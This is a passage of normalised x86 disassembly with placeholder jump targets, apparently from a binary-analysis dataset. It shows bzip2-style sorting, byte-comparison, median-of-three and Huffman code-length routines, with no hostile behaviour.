mov [ ebp - 0x18 ] ecx
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
cmp edx [ ebp + 0x1c ]
jle r-xdata
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov edx [ esi + edx * 4 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x18 ]
lea eax [ edx + ecx - 0x1 ]
cmp [ ebp - 0x18 ] eax
jg r-xdata
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
add ecx [ ebp + 0x20 ]
push ecx
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 ]
add ecx [ ebp + 0x20 ]
push ecx
call sub_4130f0
add esp 0x18
movzx edx al
test edx edx
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + eax * 4 ] edx
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x24 ]
cmp [ ecx ] 0x0
jge r-xdata
mov ecx [ ebp - 0x18 ]
sub ecx [ ebp - 0xc ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + ecx * 4 ]
mov [ eax + edx * 4 ] ecx
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x18 ]
lea edx [ ecx + eax - 0x1 ]
cmp [ ebp - 0x18 ] edx
jg r-xdata
mov edx [ ebp + 0x24 ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x4 ]
add eax [ ebp + 0x20 ]
push eax
mov ecx [ ebp - 0x18 ]
sub ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 ]
add eax [ ebp + 0x20 ]
push eax
call sub_4130f0
add esp 0x18
movzx ecx al
test ecx ecx
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov eax 0x1
test eax eax
je r-xdata
mov ecx [ ebp + 0x24 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x4 ]
add edx [ ebp + 0x20 ]
push edx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 ]
add edx [ ebp + 0x20 ]
push edx
call sub_4130f0
add esp 0x18
movzx eax al
test eax eax
je r-xdata
sub_4130f0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0x8 ]
mov dl [ ecx ]
mov [ ebp - 0x1 ] dl
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0xc ]
mov cl [ eax ]
mov [ ebp - 0x2 ] cl
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x8 ]
mov al [ edx ]
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x1 ]
movzx ecx [ ebp - 0x2 ]
cmp eax ecx
je r-xdata
movzx ecx [ ebp - 0x1 ]
movzx edx [ ebp - 0x2 ]
xor eax eax
cmp ecx edx
setg al
jmp r-xdata
mov edx [ ebp + 0x8 ]
add edx 0x1
mov [ ebp + 0x8 ] edx
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0x8 ]
mov dl [ ecx ]
mov [ ebp - 0x1 ] dl
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0xc ]
mov cl [ eax ]
mov [ ebp - 0x2 ] cl
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
cmp edx eax
je r-xdata
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
xor ecx ecx
cmp edx eax
setg cl
mov al cl
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x8 ]
mov al [ edx ]
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x1 ]
movzx ecx [ ebp - 0x2 ]
cmp eax ecx
je r-xdata
movzx ecx [ ebp - 0x1 ]
movzx edx [ ebp - 0x2 ]
xor eax eax
cmp ecx edx
setg al
jmp r-xdata
mov edx [ ebp + 0x8 ]
add edx 0x1
mov [ ebp + 0x8 ] edx
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0x8 ]
mov dl [ ecx ]
mov [ ebp - 0x1 ] dl
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0xc ]
mov cl [ eax ]
mov [ ebp - 0x2 ] cl
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
cmp edx eax
je r-xdata
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
xor ecx ecx
cmp edx eax
setg cl
mov al cl
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x8 ]
mov al [ edx ]
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x1 ]
movzx ecx [ ebp - 0x2 ]
cmp eax ecx
je r-xdata
movzx ecx [ ebp - 0x1 ]
movzx edx [ ebp - 0x2 ]
xor eax eax
cmp ecx edx
setg al
jmp r-xdata
mov edx [ ebp + 0x8 ]
add edx 0x1
mov [ ebp + 0x8 ] edx
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0x8 ]
mov dl [ ecx ]
mov [ ebp - 0x1 ] dl
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0xc ]
mov cl [ eax ]
mov [ ebp - 0x2 ] cl
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
cmp edx eax
je r-xdata
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
xor ecx ecx
cmp edx eax
setg cl
mov al cl
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x8 ]
mov al [ edx ]
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x1 ]
movzx ecx [ ebp - 0x2 ]
cmp eax ecx
je r-xdata
movzx ecx [ ebp - 0x1 ]
movzx edx [ ebp - 0x2 ]
xor eax eax
cmp ecx edx
setg al
jmp r-xdata
mov edx [ ebp + 0x8 ]
add edx 0x1
mov [ ebp + 0x8 ] edx
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0x8 ]
mov dl [ ecx ]
mov [ ebp - 0x1 ] dl
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0xc ]
mov cl [ eax ]
mov [ ebp - 0x2 ] cl
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
cmp edx eax
je r-xdata
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
xor ecx ecx
cmp edx eax
setg cl
mov al cl
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x8 ]
mov al [ edx ]
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x1 ]
movzx ecx [ ebp - 0x2 ]
cmp eax ecx
je r-xdata
movzx ecx [ ebp - 0x1 ]
movzx edx [ ebp - 0x2 ]
xor eax eax
cmp ecx edx
setg al
jmp r-xdata
mov edx [ ebp + 0x8 ]
add edx 0x1
mov [ ebp + 0x8 ] edx
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0x8 ]
mov dl [ ecx ]
mov [ ebp - 0x1 ] dl
mov eax [ ebp + 0x10 ]
add eax [ ebp + 0xc ]
mov cl [ eax ]
mov [ ebp - 0x2 ] cl
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
cmp edx eax
je r-xdata
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
xor ecx ecx
cmp edx eax
setg cl
mov al cl
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x8 ]
mov al [ edx ]
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x1 ]
movzx ecx [ ebp - 0x2 ]
cmp eax ecx
je r-xdata
movzx ecx [ ebp - 0x1 ]
movzx edx [ ebp - 0x2 ]
xor eax eax
cmp ecx edx
setg al
jmp r-xdata
mov edx [ ebp + 0x8 ]
add edx 0x1
mov [ ebp + 0x8 ] edx
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
mov ecx [ ebp + 0x18 ]
add ecx 0x8
mov [ ebp - 0x10 ] ecx
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
xor ecx ecx
cmp edx eax
setg cl
mov al cl
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0xc ] cx
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0x8 ] cx
movzx edx [ ebp - 0xc ]
movzx eax [ ebp - 0x8 ]
cmp edx eax
je r-xdata
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
xor ecx ecx
cmp edx eax
setg cl
mov al cl
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x8 ]
mov al [ edx ]
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x1 ]
movzx ecx [ ebp - 0x2 ]
cmp eax ecx
je r-xdata
movzx ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x8 ]
xor eax eax
cmp ecx edx
setg al
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0xc ] cx
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0x8 ] cx
movzx edx [ ebp - 0xc ]
movzx eax [ ebp - 0x8 ]
cmp edx eax
je r-xdata
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
xor ecx ecx
cmp edx eax
setg cl
mov al cl
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x8 ]
mov al [ edx ]
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x1 ]
movzx ecx [ ebp - 0x2 ]
cmp eax ecx
je r-xdata
movzx ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x8 ]
xor eax eax
cmp ecx edx
setg al
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0xc ] cx
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0x8 ] cx
movzx edx [ ebp - 0xc ]
movzx eax [ ebp - 0x8 ]
cmp edx eax
je r-xdata
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
xor ecx ecx
cmp edx eax
setg cl
mov al cl
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x8 ]
mov al [ edx ]
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x1 ]
movzx ecx [ ebp - 0x2 ]
cmp eax ecx
je r-xdata
movzx ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x8 ]
xor eax eax
cmp ecx edx
setg al
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0xc ] cx
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0x8 ] cx
movzx edx [ ebp - 0xc ]
movzx eax [ ebp - 0x8 ]
cmp edx eax
je r-xdata
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
xor ecx ecx
cmp edx eax
setg cl
mov al cl
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x8 ]
mov al [ edx ]
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x1 ]
movzx ecx [ ebp - 0x2 ]
cmp eax ecx
je r-xdata
movzx ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x8 ]
xor eax eax
cmp ecx edx
setg al
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0xc ] cx
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0x8 ] cx
movzx edx [ ebp - 0xc ]
movzx eax [ ebp - 0x8 ]
cmp edx eax
je r-xdata
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
xor ecx ecx
cmp edx eax
setg cl
mov al cl
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x8 ]
mov al [ edx ]
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x1 ]
movzx ecx [ ebp - 0x2 ]
cmp eax ecx
je r-xdata
movzx ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x8 ]
xor eax eax
cmp ecx edx
setg al
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0xc ] cx
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0x8 ] cx
movzx edx [ ebp - 0xc ]
movzx eax [ ebp - 0x8 ]
cmp edx eax
je r-xdata
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
xor ecx ecx
cmp edx eax
setg cl
mov al cl
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x8 ]
mov al [ edx ]
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x1 ]
movzx ecx [ ebp - 0x2 ]
cmp eax ecx
je r-xdata
movzx ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x8 ]
xor eax eax
cmp ecx edx
setg al
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0xc ] cx
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0x8 ] cx
movzx edx [ ebp - 0xc ]
movzx eax [ ebp - 0x8 ]
cmp edx eax
je r-xdata
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
xor ecx ecx
cmp edx eax
setg cl
mov al cl
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x8 ]
mov al [ edx ]
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x1 ]
movzx ecx [ ebp - 0x2 ]
cmp eax ecx
je r-xdata
movzx ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x8 ]
xor eax eax
cmp ecx edx
setg al
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0xc ] cx
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov cx [ eax + edx * 2 ]
mov [ ebp - 0x8 ] cx
movzx edx [ ebp - 0xc ]
movzx eax [ ebp - 0x8 ]
cmp edx eax
je r-xdata
movzx edx [ ebp - 0x1 ]
movzx eax [ ebp - 0x2 ]
xor ecx ecx
cmp edx eax
setg cl
mov al cl
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
mov edx [ ebp + 0x8 ]
cmp edx [ ebp + 0x18 ]
jb r-xdata
movzx ecx [ ebp - 0xc ]
movzx edx [ ebp - 0x8 ]
xor eax eax
cmp ecx edx
setg al
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp + 0x18 ]
jb r-xdata
mov eax [ ebp + 0x8 ]
sub eax [ ebp + 0x18 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x10 ]
sub eax 0x8
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
sub edx 0x1
mov eax [ ebp + 0x1c ]
mov [ eax ] edx
cmp [ ebp - 0x10 ] 0x0
jge r-xdata
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x18 ]
mov [ ebp + 0xc ] edx
mov edx [ ebp + 0x10 ]
add edx [ ebp + 0x8 ]
mov al [ edx ]
mov [ ebp - 0x1 ] al
mov ecx [ ebp + 0x10 ]
add ecx [ ebp + 0xc ]
mov dl [ ecx ]
mov [ ebp - 0x2 ] dl
movzx eax [ ebp - 0x1 ]
movzx ecx [ ebp - 0x2 ]
cmp eax ecx
je r-xdata
xor al al
sub_4138f0
push ebp
mov ebp esp
push ecx
movzx eax [ ebp + 0x8 ]
movzx ecx [ ebp + 0xc ]
cmp eax ecx
jle r-xdata
movzx edx [ ebp + 0xc ]
movzx eax [ ebp + 0x10 ]
cmp edx eax
jle r-xdata
mov dl [ ebp + 0x8 ]
mov [ ebp - 0x1 ] dl
mov al [ ebp + 0xc ]
mov [ ebp + 0x8 ] al
mov cl [ ebp - 0x1 ]
mov [ ebp + 0xc ] cl
mov al [ ebp + 0xc ]
mov esp ebp
pop ebp
retn
mov cl [ ebp + 0x10 ]
mov [ ebp + 0xc ] cl
movzx edx [ ebp + 0x8 ]
movzx eax [ ebp + 0xc ]
cmp edx eax
jle r-xdata
mov cl [ ebp + 0x8 ]
mov [ ebp + 0xc ] cl
sub_413940
push ebp
mov ebp esp
sub esp 0x1488
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp + 0x10 ]
jge r-xdata
mov eax 0x1
test eax eax
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0xc ]
cmp [ eax + edx * 4 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x103c ] 0x0
mov [ ebp - 0x1450 ] 0x0
mov [ ebp - 0x820 ] 0x0
mov [ ebp - 0x1038 ] 0xfffffffe
mov [ ebp - 0xc ] 0x1
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 ]
mov [ ebp - 0x1484 ] eax
mov [ ebp - 0x1484 ] 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x10 ]
jg r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x1484 ]
shl ecx 0x8
mov edx [ ebp - 0xc ]
mov [ ebp + edx * 4 - 0x81c ] ecx
jmp r-xdata
cmp [ ebp - 0x103c ] 0x104
jl r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x1038 ] 0xffffffff
mov edx [ ebp - 0x103c ]
add edx 0x1
mov [ ebp - 0x103c ] edx
mov eax [ ebp - 0x103c ]
mov ecx [ ebp - 0xc ]
mov [ ebp + eax * 4 - 0x1450 ] ecx
mov edx [ ebp - 0x103c ]
mov [ ebp - 0x1460 ] edx
mov eax [ ebp - 0x1460 ]
mov ecx [ ebp + eax * 4 - 0x1450 ]
mov [ ebp - 0x145c ] ecx
cmp [ ebp - 0x103c ] 0x1
jle r-xdata
push 0x7d1
call sub_4057d5
add esp 0x4
mov ecx [ ebp - 0x1460 ]
mov edx [ ebp - 0x145c ]
mov [ ebp + ecx * 4 - 0x1450 ] edx
jmp r-xdata
mov eax [ ebp - 0x1460 ]
sar eax 0x1
mov ecx [ ebp - 0x1460 ]
mov edx [ ebp + eax * 4 - 0x1450 ]
mov [ ebp + ecx * 4 - 0x1450 ] edx
mov eax [ ebp - 0x1460 ]
sar eax 0x1
mov [ ebp - 0x1460 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x204
jl r-xdata
mov eax [ ebp - 0x144c ]
mov [ ebp - 0x824 ] eax
mov ecx [ ebp - 0x103c ]
mov edx [ ebp + ecx * 4 - 0x1450 ]
mov [ ebp - 0x144c ] edx
mov eax [ ebp - 0x103c ]
sub eax 0x1
mov [ ebp - 0x103c ] eax
mov [ ebp - 0x1468 ] 0x1
mov ecx [ ebp - 0x1468 ]
mov edx [ ebp + ecx * 4 - 0x1450 ]
mov [ ebp - 0x1464 ] edx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x1460 ]
sar edx 0x1
mov eax [ ebp + edx * 4 - 0x1450 ]
mov ecx [ ebp - 0x145c ]
mov edx [ ebp + ecx * 4 - 0x820 ]
cmp edx [ ebp + eax * 4 - 0x820 ]
jge r-xdata
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
jmp r-xdata
push 0x7d2
call sub_4057d5
add esp 0x4
mov eax [ ebp - 0x1468 ]
mov ecx [ ebp - 0x1464 ]
mov [ ebp + eax * 4 - 0x1450 ] ecx
mov edx [ ebp - 0x144c ]
mov [ ebp - 0x1454 ] edx
mov eax [ ebp - 0x103c ]
mov ecx [ ebp + eax * 4 - 0x1450 ]
mov [ ebp - 0x144c ] ecx
mov edx [ ebp - 0x103c ]
sub edx 0x1
mov [ ebp - 0x103c ] edx
mov [ ebp - 0x1474 ] 0x1
mov eax [ ebp - 0x1474 ]
mov ecx [ ebp + eax * 4 - 0x1450 ]
mov [ ebp - 0x1470 ] ecx
mov ecx [ ebp - 0x1468 ]
shl ecx 0x1
mov [ ebp - 0x146c ] ecx
mov edx [ ebp - 0x146c ]
cmp edx [ ebp - 0x103c ]
jle r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x10 ]
jg r-xdata
mov edx [ ebp - 0x1474 ]
mov eax [ ebp - 0x1470 ]
mov [ ebp + edx * 4 - 0x1450 ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x1454 ]
mov eax [ ebp - 0x8 ]
mov [ ebp + edx * 4 - 0x1038 ] eax
mov ecx [ ebp - 0x824 ]
mov edx [ ebp - 0x8 ]
mov [ ebp + ecx * 4 - 0x1038 ] edx
mov eax [ ebp - 0x824 ]
mov ecx [ ebp + eax * 4 - 0x820 ]
and ecx 0xff
mov edx [ ebp - 0x1454 ]
mov eax [ ebp + edx * 4 - 0x820 ]
and eax 0xff
cmp ecx eax
jle r-xdata
mov eax [ ebp - 0x1474 ]
shl eax 0x1
mov [ ebp - 0x1478 ] eax
mov ecx [ ebp - 0x1478 ]
cmp ecx [ ebp - 0x103c ]
jle r-xdata
mov eax [ ebp - 0x146c ]
cmp eax [ ebp - 0x103c ]
jge r-xdata
jmp r-xdata
movzx eax [ ebp - 0x1 ]
test eax eax
jne r-xdata
mov [ ebp - 0x1458 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x1040 ] ecx
mov eax [ ebp - 0x1454 ]
mov ecx [ ebp + eax * 4 - 0x820 ]
and ecx 0xff
mov [ ebp - 0x1488 ] ecx
mov ecx [ ebp - 0x824 ]
mov edx [ ebp + ecx * 4 - 0x820 ]
and edx 0xff
mov [ ebp - 0x1488 ] edx
jmp r-xdata
mov edx [ ebp - 0x1478 ]
cmp edx [ ebp - 0x103c ]
jge r-xdata
jmp r-xdata
mov ecx [ ebp - 0x146c ]
mov edx [ ebp + ecx * 4 - 0x1450 ]
mov eax [ ebp - 0x1464 ]
mov ecx [ ebp + eax * 4 - 0x820 ]
cmp ecx [ ebp + edx * 4 - 0x820 ]
jge r-xdata
mov ecx [ ebp - 0x146c ]
mov edx [ ebp + ecx * 4 - 0x144c ]
mov eax [ ebp - 0x146c ]
mov ecx [ ebp + eax * 4 - 0x1450 ]
mov edx [ ebp + edx * 4 - 0x820 ]
cmp edx [ ebp + ecx * 4 - 0x820 ]
jge r-xdata
mov [ ebp - 0xc ] 0x1
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
